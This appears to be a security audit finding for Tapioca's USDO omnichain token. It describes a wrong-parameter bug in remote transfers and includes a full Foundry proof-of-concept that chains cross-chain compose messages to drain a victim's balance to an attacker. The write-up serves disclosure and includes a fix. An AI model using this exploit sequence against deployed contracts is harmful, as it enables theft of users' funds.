Skinny Wool Mallard

high

# Wrong parameter in remote transfer makes it possible to steal all USDO balance from users

## Summary
Setting a wrong parameter when performing remote transfers enables an attack flow where USDO can be stolen from users.

## Vulnerability Detail

The following bug describes a way to leverage  Tapioca’s remote transfers in order to drain any user’s USDO balance. Before diving into the issue, a bit of background regarding compose calls is required in order to properly understand the attack.

Tapioca allows users to leverage LayerZero’s [compose calls](https://docs.layerzero.network/contracts/oft-composing), which enable complex interactions between messages sent across chains. Compose messages are always preceded by a sender address in order for the destination chain to understand who the sender of the compose message is. When the compose message is received, `TapiocaOmnichainReceiver.lzCompose()` will decode the compose message, extract the `srcChainSender_` and trigger the internal `_lzCompose()` call with the decoded `srcChainSender_` as the sender:

```solidity
// TapiocaOmnichainReceiver.sol
function lzCompose(  
        address _from,
        bytes32 _guid,
        bytes calldata _message,
        address, //executor
        bytes calldata //extra Data
    ) external payable override {
        ...
   
        // Decode LZ compose message.
        (address srcChainSender_, bytes memory oftComposeMsg_) =
            TapiocaOmnichainEngineCodec.decodeLzComposeMsg(_message);

        // Execute the composed message.  
        _lzCompose(srcChainSender_, _guid, oftComposeMsg_);  
    }
```

One of the type of compose calls supported in tapioca are remote transfers. When the internal `_lzCompose()` is triggered, users who specify a msgType equal to `MSG_REMOTE_TRANSFER` will make the `_remoteTransferReceiver()` internal call be executed:

```solidity
// TapiocaOmnichainReceiver.sol
function _lzCompose(address srcChainSender_, bytes32 _guid, bytes memory oftComposeMsg_) internal {
        // Decode OFT compose message.
        (uint16 msgType_,,, bytes memory tapComposeMsg_, bytes memory nextMsg_) =
            TapiocaOmnichainEngineCodec.decodeToeComposeMsg(oftComposeMsg_);

        // Call Permits/approvals if the msg type is a permit/approval.
        // If the msg type is not a permit/approval, it will call the other receivers. 
        if (msgType_ == MSG_REMOTE_TRANSFER) {   
            _remoteTransferReceiver(srcChainSender_, tapComposeMsg_);   

			...

}
```

Remote transfers allow users to burn tokens in one chain and mint them in another chain by executing a recursive `_lzSend()` call. In order to burn the tokens, they will first be transferred from an **arbitrary owner set by the function caller** via the `_internalTransferWithAllowance()` function.

```solidity
// TapiocaOmnichainReceiver.sol

function _remoteTransferReceiver(address _srcChainSender, bytes memory _data) internal virtual {
        RemoteTransferMsg memory remoteTransferMsg_ = TapiocaOmnichainEngineCodec.decodeRemoteTransferMsg(_data);

        /// @dev xChain owner needs to have approved dst srcChain `sendPacket()` msg.sender in a previous composedMsg. Or be the same address.
        _internalTransferWithAllowance(
            remoteTransferMsg_.owner, _srcChainSender, remoteTransferMsg_.lzSendParam.sendParam.amountLD
        );  
          
        // Make the internal transfer, burn the tokens from this contract and send them to the recipient on the other chain.
        _internalRemoteTransferSendPacket(
            remoteTransferMsg_.owner, 
            remoteTransferMsg_.lzSendParam, 
            remoteTransferMsg_.composeMsg 
        ); 
      
        ...
    }
```

After transferring the tokens via `_internalTransferWithAllowance()`, `_internalRemoteTransferSendPacket()` will be triggered, which is the function that will actually burn the tokens and execute the recursive `_lzSend()` call:

```solidity
// TapiocaOmnichainReceiver.sol

function _internalRemoteTransferSendPacket(    
        address _srcChainSender,
        LZSendParam memory _lzSendParam,   
        bytes memory _composeMsg
    ) internal returns (MessagingReceipt memory msgReceipt, OFTReceipt memory oftReceipt) {
        // Burn tokens from this contract
        (uint256 amountDebitedLD_, uint256 amountToCreditLD_) = _debitView(
            _lzSendParam.sendParam.amountLD, _lzSendParam.sendParam.minAmountLD, _lzSendParam.sendParam.dstEid 
        );   
        _burn(address(this), amountToCreditLD_); 
   
        ...
      
        // Builds the options and OFT message to quote in the endpoint.
        (bytes memory message, bytes memory options) = _buildOFTMsgAndOptionsMemory(
            _lzSendParam.sendParam, _lzSendParam.extraOptions, _composeMsg, amountToCreditLD_, _srcChainSender 
        ); // msgSender is the sender of the composed message. We keep context by passing `_srcChainSender`.
    
        // Sends the message to the LayerZero endpoint and returns the LayerZero msg receipt.
        msgReceipt =
            _lzSend(_lzSendParam.sendParam.dstEid, message, options, _lzSendParam.fee, _lzSendParam.refundAddress);
        ...
    }
```

As we can see, the `_lzSend()` call performed inside `_internalRemoteTransferSendPacket()` allows to trigger the remote call with another compose message (built using the `_buildOFTMsgAndOptionsMemory()` function). If there is an actual `_composeMsg` to be appended, the sender of such message will be set to the `_internalRemoteTransferSendPacket()` function’s `_srcChainSender` parameter.

The problem is that when `_internalRemoteTransferSendPacket()` is called, the parameter passed as the source chain sender is set to the **arbitrary owner address** supplied by the caller in the initial compose call, instead of the actual source chain sender:

```solidity
// TapiocaOmnichainReceiver.sol

function _remoteTransferReceiver(address _srcChainSender, bytes memory _data) internal virtual {
        ...
          
        // Make the internal transfer, burn the tokens from this contract and send them to the recipient on the other chain.
        _internalRemoteTransferSendPacket(
            remoteTransferMsg_.owner,  // <------ This parameter will become the _srcChainSender in the recursive compose message call
            remoteTransferMsg_.lzSendParam, 
            remoteTransferMsg_.composeMsg 
        ); 
      
        ...
    }
```

This makes it possible for an attacker to create an attack vector that allows to drain any user’s USDO balance. The attack path is as follows:

1. Execute a remote call from chain A to chain B. This call has a compose message that will be triggered in chain B.
    1. The remote transfer message will set the arbitrary `owner` to any victim’s address. It is important to also set the amount to be transferred in this first compose call to 0 so that the attacker can bypass the allowance check performed inside the `_remoteTransferReceiver()` call.
2. When the compose call gets executed, a second packed compose message will be built and triggered inside `_internalRemoteTransferSendPacket()`. This second compose message will be sent from chain B to chain A, and the source chain sender will be set to the arbitrary `owner` address that the attacker wants to drain due to the incorrect parameter being passed. It will also be a remote transfer action.
3. When chain A receives the compose message, a third compose will be triggered. This third compose is where the token transfers will take place. Inside the `_lzReceive()` triggered in chain A, the composed message will instruct to transfer and burn a certain amount of tokens (selected by the attacker when crafting the attack). Because the source chain sender is the victim address and the `owner` specified is also the victim, the `_internalTransferWithAllowance()` executed in chain A will not check for allowances because the owner and the spender are the same address (the victim’s address). This will burn the attacker’s desired amount from the victim’s wallet.
4. Finally, a last `_lzSend()` will be triggered to chain B, where the burnt tokens in chain A will be minted. Because the compose calls allow to set a specific recipient address, the receiver of the minted tokens will be the `attacker`.

As a summary: the attack allows to combine several compose calls recursively so that an attacker can burn victim’s tokens in Chain A, and mint them in chain B to a desired address. The following diagram summarizes the attack for clarity:

![attack](https://github.com/sherlock-audit/2024-02-tapioca-0xadrii/assets/56537955/85be7502-808d-47c5-b635-dd2b8618ca8f)

## Proof of concept

The following proof of concept illustrates how the mentioned attack can take place. In order to execute the PoC, the following steps must be performed:

1. Create an `EnpointMock.sol` file inside the `test` folder inside `Tapioca-bar` and paste the following code (the current tests are too complex, this imitates LZ’s endpoint contracts and reduces the poc’s complexity):

```solidity
// SPDX-License-Identifier: LZBL-1.2

pragma solidity ^0.8.20;

struct MessagingReceipt {
    bytes32 guid;
    uint64 nonce;
    MessagingFee fee;
}

struct MessagingParams {
    uint32 dstEid;
    bytes32 receiver;
    bytes message;
    bytes options; 
    bool payInLzToken;
}

struct MessagingFee {
    uint256 nativeFee;
    uint256 lzTokenFee;
}
contract MockEndpointV2  {

  
    function send(
        MessagingParams calldata _params,
        address _refundAddress
    ) external payable  returns (MessagingReceipt memory receipt) {
        // DO NOTHING
    }

    /// @dev the Oapp sends the lzCompose message to the endpoint
    /// @dev the composer MUST assert the sender because anyone can send compose msg with this function
    /// @dev with the same GUID, the Oapp can send compose to multiple _composer at the same time
    /// @dev authenticated by the msg.sender
    /// @param _to the address which will receive the composed message
    /// @param _guid the message guid
    /// @param _message the message
    function sendCompose(address _to, bytes32 _guid, uint16 _index, bytes calldata _message) external {
         // DO NOTHING
        
    }
  
}

```

1. Import and deploy two mock endpoints in the `Usdo.t.sol` file
2. Change the inherited OApp in `Usdo.sol` ’s implementation so that the endpoint variable is not immutable and add a `setEndpoint()` function so that the endpoint configured in `setUp()` can be chainged to the newly deployed endpoints
3. Paste the following test insde `Usdo.t.sol` :

```solidity
function testVuln_stealUSDOFromATargetUserDueToWrongParameter() public {

        // Change configured enpoints

        endpoints[aEid] = address(mockEndpointV2A);
        endpoints[bEid] = address(mockEndpointV2B);

        aUsdo.setEndpoint(address(mockEndpointV2A));
        bUsdo.setEndpoint(address(mockEndpointV2B));

        
        
        deal(address(aUsdo), makeAddr("victim"), 100 ether);

        ////////////////////////////////////////////////////////
        //                 PREPARE MESSAGES                   //
        ////////////////////////////////////////////////////////

        // FINAL MESSAGE    A ---> B                  

        SendParam memory sendParamAToBVictim = SendParam({
            dstEid: bEid,
            to: OFTMsgCodec.addressToBytes32(makeAddr("attacker")),
            amountLD: 100 ether, // IMPORTANT: This must be set to the amount we want to steal
            minAmountLD: 100 ether,
            extraOptions: bytes(""),
            composeMsg: bytes(""),
            oftCmd: bytes("")
        });  
        MessagingFee memory feeAToBVictim = MessagingFee({
            nativeFee: 0,
            lzTokenFee: 0
        });
        
        LZSendParam memory lzSendParamAToBVictim = LZSendParam({
            sendParam: sendParamAToBVictim,
            fee: feeAToBVictim,
            extraOptions: bytes(""),
            refundAddress: makeAddr("attacker")
        });

        RemoteTransferMsg memory remoteTransferMsgVictim = RemoteTransferMsg({
            owner: makeAddr("victim"), // IMPORTANT: This will make the attack be triggered as the victim will become the srcChainSender in the destination chain
            composeMsg: bytes(""),
            lzSendParam: lzSendParamAToBVictim
        });

        uint16 index; // needed to bypass Solidity's encoding literal error
        // Create Toe Compose message for the victim
        bytes memory toeComposeMsgVictim = abi.encodePacked(
            PT_REMOTE_TRANSFER, // msgType
            uint16(abi.encode(remoteTransferMsgVictim).length), // message length (0)
            index, // index
            abi.encode(remoteTransferMsgVictim), // message
            bytes("") // next message
        );

        // SECOND MESSAGE     B ---> A                 

        SendParam memory sendParamBToA = SendParam({
            dstEid: aEid,
            to: OFTMsgCodec.addressToBytes32(makeAddr("attacker")),
            amountLD: 0, // IMPORTANT: This must be set to 0 to bypass the allowance check performed inside `_remoteTransferReceiver()`
            minAmountLD: 0,
            extraOptions: bytes(""),
            composeMsg: bytes(""),
            oftCmd: bytes("")
        });  
        MessagingFee memory feeBToA = MessagingFee({
            nativeFee: 0,
            lzTokenFee: 0
        });
        
        LZSendParam memory lzSendParamBToA = LZSendParam({
            sendParam: sendParamBToA,
            fee: feeBToA,
            extraOptions: bytes(""),
            refundAddress: makeAddr("attacker")
        });

        // Create remote transfer message
        RemoteTransferMsg memory remoteTransferMsg = RemoteTransferMsg({
            owner: makeAddr("victim"), // IMPORTANT: This will make the attack be triggered as the victim will become the srcChainSender in the destination chain
            composeMsg: toeComposeMsgVictim,
            lzSendParam: lzSendParamBToA
        });

        // Create Toe Compose message
        bytes memory toeComposeMsg = abi.encodePacked(
            PT_REMOTE_TRANSFER, // msgType
            uint16(abi.encode(remoteTransferMsg).length), // message length
            index, // index
            abi.encode(remoteTransferMsg),
            bytes("") // next message
        );
         
        // INITIAL MESSAGE       A ---> B                      

        // Create `_lzSendParam` parameter for `sendPacket()`
        SendParam memory sendParamAToB = SendParam({
            dstEid: bEid,
            to: OFTMsgCodec.addressToBytes32(makeAddr("attacker")),
            amountLD: 0,
            minAmountLD: 0,
            extraOptions: bytes(""),
            composeMsg: bytes(""),
            oftCmd: bytes("")
        });  
        MessagingFee memory feeAToB = MessagingFee({
            nativeFee: 0,
            lzTokenFee: 0
        });
        
        LZSendParam memory lzSendParamAToB = LZSendParam({
            sendParam: sendParamAToB,
            fee: feeAToB,
            extraOptions: bytes(""),
            refundAddress: makeAddr("attacker")
        });

        vm.startPrank(makeAddr("attacker"));
        aUsdo.sendPacket(lzSendParamAToB, toeComposeMsg);

        // EXECUTE ATTACK

        // Execute first lzReceive() --> receive message in chain B
    
        vm.startPrank(endpoints[bEid]);
        UsdoReceiver(address(bUsdo)).lzReceive(
            Origin({sender: OFTMsgCodec.addressToBytes32(address(aUsdo)), srcEid: aEid, nonce: 0}), 
            OFTMsgCodec.addressToBytes32(address(0)), // guid (not needed for the PoC)
            abi.encodePacked( // same as _buildOFTMsgAndOptions()
                sendParamAToB.to,
                 index,  // amount (use an initialized 0 variable due to Solidity restrictions)
                 OFTMsgCodec.addressToBytes32(makeAddr("attacker")),
                toeComposeMsg
            ), // message
            address(0), // executor (not used)
            bytes("") // extra data (not used)
        );

        // Compose message is sent in `lzReceive()`, we need to trigger `lzCompose()`.
        // This triggers a message back to chain A, in which the srcChainSender will be set as the victim inside the
        // composed message due to the wrong parameter passed
        UsdoReceiver(address(bUsdo)).lzCompose(
            address(bUsdo), 
            OFTMsgCodec.addressToBytes32(address(0)), // guid (not needed for the PoC)
            abi.encodePacked(OFTMsgCodec.addressToBytes32(address(aUsdo)), toeComposeMsg), // message
            address(0), // executor (not used)
            bytes("") // extra data (not used)
        );

        vm.startPrank(endpoints[aEid]);

        // Chain A: message is received, internally a compose flow is retriggered.
        UsdoReceiver(address(aUsdo)).lzReceive(
            Origin({sender: OFTMsgCodec.addressToBytes32(address(bUsdo)), srcEid: bEid, nonce: 0}), 
            OFTMsgCodec.addressToBytes32(address(0)), // guid (not needed for the PoC)
            abi.encodePacked( // same as _buildOFTMsgAndOptions()
                sendParamAToB.to,
                 index,  // amount
                 OFTMsgCodec.addressToBytes32(makeAddr("attacker")),
                toeComposeMsgVictim
            ), // message
            address(0), // executor (not used)
            bytes("") // extra data (not used)
        );

        // Compose message is sent in `lzReceive()`, we need to trigger `lzCompose()`.
        // At this point, the srcChainSender is the victim (as set in the previous lzCompose) because of the wrong parameter (the `expectEmit` verifies it).
        // The `owner` specified for the remote transfer is also the victim, so the allowance check is bypassed because `owner` == `srcChainSender`.
        // This allows the tokens to be burnt, and a final message is triggered to the destination chain
        UsdoReceiver(address(aUsdo)).lzCompose(
            address(aUsdo), 
            OFTMsgCodec.addressToBytes32(address(0)), // guid (not needed for the PoC)
            abi.encodePacked(OFTMsgCodec.addressToBytes32(address(makeAddr("victim"))), toeComposeMsgVictim), // message (srcChainSender becomes victim because of wrong parameter set)
            address(0), // executor (not used)
            bytes("") // extra data (not used)
        );

        // Back to chain B. Finally, the burnt tokens from the victim in chain A get minted in chain B with the attacker set as the destination
        {
            uint64 tokenAmountSD = usdoHelper.toSD(100 ether, bUsdo.decimalConversionRate());
            
            vm.startPrank(endpoints[bEid]);
            UsdoReceiver(address(bUsdo)).lzReceive(
                Origin({sender: OFTMsgCodec.addressToBytes32(address(aUsdo)), srcEid: aEid, nonce: 0}), 
                OFTMsgCodec.addressToBytes32(address(0)), // guid (not needed for the PoC)
                abi.encodePacked( // same as _buildOFTMsgAndOptions()
                   OFTMsgCodec.addressToBytes32(makeAddr("attacker")),
                    tokenAmountSD
                ), // message
                address(0), // executor (not used)
                bytes("") // extra data (not used)
            );

        }

        // Finished: victim gets drained, attacker obtains balance of victim
        assertEq(bUsdo.balanceOf(makeAddr("victim")), 0);
        assertEq(bUsdo.balanceOf(makeAddr("attacker")), 100 ether);
          
    } 
```

Run the poc with the following command: `forge test --mt testVuln_stealUSDOFromATargetUserDueToWrongParameter`

The proof of concept shows how in the end, the victim’s `aUsdo` balance will become 0, while all the `bUsdo` in chain B will be minted to the attacker.


## Impact

High. An attacker can drain any USDO holder’s balance and transfer it to themselves.

## Code Snippet

https://github.com/sherlock-audit/2024-02-tapioca/blob/main/Tapioca-bar/gitmodule/tapioca-periph/contracts/tapiocaOmnichainEngine/TapiocaOmnichainReceiver.sol#L224

## Tool used

Manual Review, foundry

## Recommendation

Change the parameter passed in the `_internalRemoteransferSendPacket()` call so that the sender in the compose call built inside it is actually the real source chain sender. This will make it be kept along all the possible recursive calls that might take place:

```diff
function _remoteTransferReceiver(address _srcChainSender, bytes memory _data) internal virtual {
        RemoteTransferMsg memory remoteTransferMsg_ = TapiocaOmnichainEngineCodec.decodeRemoteTransferMsg(_data);

        /// @dev xChain owner needs to have approved dst srcChain `sendPacket()` msg.sender in a previous composedMsg. Or be the same address.
        _internalTransferWithAllowance(
            remoteTransferMsg_.owner, _srcChainSender, remoteTransferMsg_.lzSendParam.sendParam.amountLD
        );  
          
        // Make the internal transfer, burn the tokens from this contract and send them to the recipient on the other chain.
        _internalRemoteTransferSendPacket(
-            remoteTransferMsg_.owner,
+           _srcChainSender
            remoteTransferMsg_.lzSendParam, 
            remoteTransferMsg_.composeMsg 
        ); 
      
        emit RemoteTransferReceived(
            remoteTransferMsg_.owner,
            remoteTransferMsg_.lzSendParam.sendParam.dstEid,
            OFTMsgCodec.bytes32ToAddress(remoteTransferMsg_.lzSendParam.sendParam.to),
            remoteTransferMsg_.lzSendParam.sendParam.amountLD
        );
    }
```
